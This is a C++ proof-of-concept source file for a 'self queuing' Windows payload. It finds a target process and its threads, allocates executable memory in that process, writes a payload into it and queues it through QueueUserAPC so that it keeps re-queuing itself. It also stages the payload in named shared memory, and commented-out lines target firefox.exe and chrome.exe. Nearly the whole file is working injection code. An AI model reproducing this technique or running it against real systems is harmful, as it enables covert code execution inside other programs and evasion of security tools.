/*-----------------------------------------------------------------------------------------*
 *                            SELF QUEUING PAYLOAD - PoC                                   *
 *-----------------------------------------------------------------------------------------*/
/* The process Queues APC in a process mentioned,
 *			and the queues APC function will queue itself to the same process
 *			thus entering a loop of APC Queues
 */

#include <windows.h>
#include <TlHelp32.h>
#include <vector>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include "stdafx.h"
#include "headers.h"

#define QUEUE_COUNT 2
#define START_THREAD 5

#pragma comment (lib, "Ws2_32.lib")                     // Need to link with Ws2_32.lib
using namespace std;

LPVOID      EXECUTER;
ULONG       EXE_SIZE;


void get_executer_details(){
    LPBYTE  p;                          // auxilary pointer
	DWORD old;
    //VirtualProtect((LPVOID)((ULONG)executer), 0x8000, PAGE_EXECUTE_READWRITE, &old );
	//EXECUTER =  (LPBYTE)((ULONG)executer + *(LPDWORD)((ULONG)executer + 1) + 5);
	EXECUTER = executer;
    for( p=(LPBYTE)EXECUTER; strcmp((char*)p, "SelfQueuing_end$$$"); p++ )
        ;
    EXE_SIZE = (ULONG)p + 19 + 9 - (ULONG)EXECUTER;               // get function size

}


bool write_to_shared_mem(){
	/* write executer to Shared memory */
    HANDLE hMapFile;
    LPBYTE shptr;
	char sharedMemName[] = {'S','Q','S','h','a','r','e','d','M','e','m','$','$','$',0};
    if((hMapFile = CreateFileMapping(
                      INVALID_HANDLE_VALUE,     // use paging file
                      NULL,                     // default security
                      PAGE_READWRITE,           // read/write access
                      HIWORD(EXE_SIZE),         // maximum object size (high-order DWORD)
                      LOWORD(EXE_SIZE),			// maximum object size (low-order DWORD)
					  sharedMemName)			// name of mapping object
				 ) == NULL){
        cout<<"Failed to allocate Shared Memory"<<endl;
		return false;
	}
    if((shptr = (LPBYTE) MapViewOfFileEx(
                    hMapFile,                               // handle to map object
                    FILE_MAP_ALL_ACCESS,                    // read/write permission
                    0,                                      // high-order 32 bits of file offset
                    0,                                      // low-order 32 bits of file offset
                    EXE_SIZE,                               // number of bytes to map
                    NULL									// base address (NULL if we don't care)
                )) == NULL ) {                              // does an error occured ?
        CloseHandle(hMapFile);                              // close memory mapped file
															// The SharedRegion is destroyed only after
															//		UnMapViewOfFile is ALSO called, which we won't do :P
		cout<<"Can't map view of file"<<endl;
		return false;
    }
	CopyMemory((PVOID)shptr, (void*)EXECUTER, EXE_SIZE);    
	return true;
}

bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
    auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return false;
    pid = 0;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (::Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName) == 0) {
                pid = pe.th32ProcessID;
                cout<<"[i] Found process ("<<exeName<<"), pid: "<<pid<<endl;
                THREADENTRY32 te = { sizeof(te) };
                cout<<"[i] Threads found to inject: ";
                if (::Thread32First(hSnapshot, &te)) {
                    do {
                        if (te.th32OwnerProcessID == pid) {
                            cout<<te.th32ThreadID<<"  ";
                            tids.push_back(te.th32ThreadID);
                        }
                    } while (::Thread32Next(hSnapshot, &te));
                }
                cout<<endl;
                break;
            }
        } while (::Process32Next(hSnapshot, &pe));
    }
    ::CloseHandle(hSnapshot);
    return pid > 0 && !tids.empty();
}

void inject(char* process){
    DWORD pid;
    vector<DWORD> tids;

    if (FindProcess(process, pid, tids)) {
        HANDLE hProcess = ::OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, pid);
        if(hProcess==NULL){
            cout<<"[!] failed to get handle for process: "<<pid<<endl;
            return;
        }
        auto p = ::VirtualAllocEx(hProcess, NULL, EXE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(p==NULL) {
            cout<<"[!] memory allocation failed!"<<endl;
            return ;
        }else{cout<<"[+] virtual mem allocation success"<<endl;}
        unsigned long injectedFn = (unsigned long)p;
        cout<<"[i] allocated memory address: 0x"<<hex<<injectedFn<<dec<<endl;

		if(::WriteProcessMemory(hProcess, p, EXECUTER, EXE_SIZE, NULL)==0){
            DWORD err = GetLastError();
            cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
            return ;
        }else{cout<<"[+] write to process success"<<endl;}
        // cout<<"[+] Sleeping for 15s"<<endl;
        // Sleep(15000);
        for(vector<DWORD>::size_type i = START_THREAD; i != tids.size(); i++) {
            DWORD tid = tids[i];
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, tid);
            cout<<endl;
            ULONG_PTR parameter = (ULONG_PTR)EXE_SIZE; // pass executer size as argument
			cout<<"[i] Attempting APC Queue for process: "<<process<<", thread: "<<tid<<endl;
			cout<<"[>] waiting for [Enter]"<<endl;
			cin.get();
            if (hThread!=NULL) {
                if(::QueueUserAPC(
                    (PAPCFUNC)p,
                    hThread, 
                    parameter)==0){
                    cout<<"[!] failed to queue user apc"<<endl;
                }
                else{
                    cout<<"[+] user apc queued for thread (id: "<<tid<<")"<<endl;
                }
            }
            else{
                cout<<"[!] OpenThread failed to open thread (id: "<<tid<<")"<<endl;
                return;
            }
			if(i-START_THREAD >= QUEUE_COUNT)
	            break;
        }
        ::VirtualFreeEx(hProcess, p, 0, MEM_RELEASE | MEM_DECOMMIT);
        cout<<"[+] VirtualFreeEx"<<endl;
    }
    else{
        cout<<"[!] specified process not found"<<endl;
    }
}


DWORD __stdcall threadFn(LPVOID parameter){
	char c;
	do{
		while(true){
			SleepEx(5000, TRUE);
		}
		cout<<"[?] Exit APC THREAD? "<<endl;
		cin>>c;
	}while(c=='n');
	return 0;
}

void __cdecl main(int argc, char* argv[]){
#ifdef __SELF_INJECTION__
	DWORD threadId;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)threadFn, 0, 0, &threadId);
	cout<<"[i] ThreadId: "<<threadId<<endl;
#endif
	get_executer_details();
	if(!write_to_shared_mem()) return;
    //inject("firefox.exe");
    //inject("chrome.exe");
#ifdef __USE_NT_FUNCTIONS__
	executer((LPVOID)EXE_SIZE, NULL, NULL);
#else
	executer(EXE_SIZE);
#endif
#ifdef __SELF_INJECTION__
	while(true){
		SleepEx(1000, TRUE);
	}
#endif
    return;

}